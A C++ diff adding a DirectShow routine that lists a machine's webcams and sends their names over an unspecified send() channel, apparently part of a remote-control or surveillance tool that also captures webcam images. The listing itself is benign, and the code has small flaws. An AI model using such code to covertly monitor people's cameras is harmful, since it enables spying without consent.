@@ -1,3 +1,50 @@
+void GetConnectedWebcams()
+{
+	ICaptureGraphBuilder2 *pBuild;
+	ICreateDevEnum *pDevEnum;
+	IPropertyBag *pPropBag;
+	IGraphBuilder *pGraph;
+	IEnumMoniker *pEnum;
+	IMoniker *pMoniker;
+	HRESULT webcam;
+	VARIANT var;
+
+	VariantInit(&var);
+	webcam = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+	webcam = CoCreateInstance(CLSID_CaptureGraphBuilder2, NULL, CLSCTX_INPROC_SERVER, IID_ICaptureGraphBuilder2, (void**)&pBuild);
+	webcam = CoCreateInstance(CLSID_FilterGraph, 0, CLSCTX_INPROC_SERVER, IID_IFilterGraph, (void**)&pGraph);
+
+	webcam = CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pDevEnum));
+	webcam = pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0);
+	if (webcam == S_FALSE) {
+		send("NO_WEBCAMS");
+		return;
+	}
+
+	std::wstring cams;
+	while (pEnum->Next(1, &pMoniker, NULL) == S_OK)
+	{
+			webcam = pMoniker->BindToStorage(0, 0, IID_PPV_ARGS(&pPropBag));
+			if (FAILED(webcam)) {
+				pMoniker->Release();
+				continue;
+			}
+
+			webcam = pPropBag->Read(L"FriendlyName", &var, 0);
+			if (SUCCEEDED(webcam)) {
+				std::wstring cd = (wchar_t*)var.bstrVal + (std::wstring)L"\n";
+				cams.append(cd);
+				VariantClear(&var);
+			}
+			
+			pPropBag->Release();
+			pMoniker->Release();
+		}
+
+		std::string cameraList(cams.begin(), cams.end());
+		send(cameraList);
+}
+
 void CaptureWebcam()
 {
 		int cameras;
